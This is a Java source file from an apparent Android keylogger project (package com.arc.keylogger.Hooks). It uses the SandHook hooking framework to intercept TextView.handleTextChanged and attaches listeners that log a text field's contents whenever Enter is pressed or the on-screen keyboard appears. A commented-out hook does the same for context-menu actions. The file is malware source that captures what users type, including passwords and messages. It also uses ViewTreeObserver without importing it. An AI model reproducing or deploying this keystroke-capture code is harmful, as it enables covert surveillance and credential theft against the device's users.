package com.arc.keylogger.Hooks;

import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.TextView;

import com.swift.sandhook.SandHook;
import com.swift.sandhook.annotation.HookClass;
import com.swift.sandhook.annotation.HookMethod;
import com.swift.sandhook.annotation.HookMethodBackup;
import com.swift.sandhook.annotation.MethodParams;
import com.swift.sandhook.annotation.ThisObject;

import java.lang.reflect.Method;

@HookClass(TextView.class)
public class TextViewHooker {
    /*@HookMethodBackup("onTextContextMenuItem")
    @MethodParams(int.class)
    static Method onTextContextMenuItemBackup;

    @HookMethod("onTextContextMenuItem")
    @MethodParams(int.class)
    public static boolean onTextContextMenuItem(@ThisObject TextView thiz, int id) throws Throwable {
        Log.e("TextViewHooker", String.valueOf(thiz.getText()));
        SandHook.callOriginByBackup(onTextContextMenuItemBackup, thiz, id);
        return false;
    }*/

    @HookMethodBackup("handleTextChanged")
    @MethodParams({CharSequence.class, int.class, int.class, int.class})
    static Method handleTextChangedBackup;

    @HookMethod("handleTextChanged")
    @MethodParams({CharSequence.class, int.class, int.class, int.class})
    public static void handleTextChanged(@ThisObject TextView thiz, CharSequence buffer, int start, int before, int after) throws Throwable {
        thiz.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View v, int keyCode, KeyEvent event) {
                if (keyCode == KeyEvent.KEYCODE_ENTER && event.getAction() == KeyEvent.ACTION_DOWN) {
                    Log.e("TextViewHooker", String.valueOf(thiz.getText()));
                }
                return false;
            }
        });
        thiz.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() {
                int heightDiff = thiz.getRootView().getHeight() - thiz.getHeight();
                if (heightDiff > 100) {
                    Log.e("TextViewHooker", String.valueOf(thiz.getText()));
                }
            }
        });
        SandHook.callOriginByBackup(handleTextChangedBackup, thiz, buffer, start, before, after);
    }
}
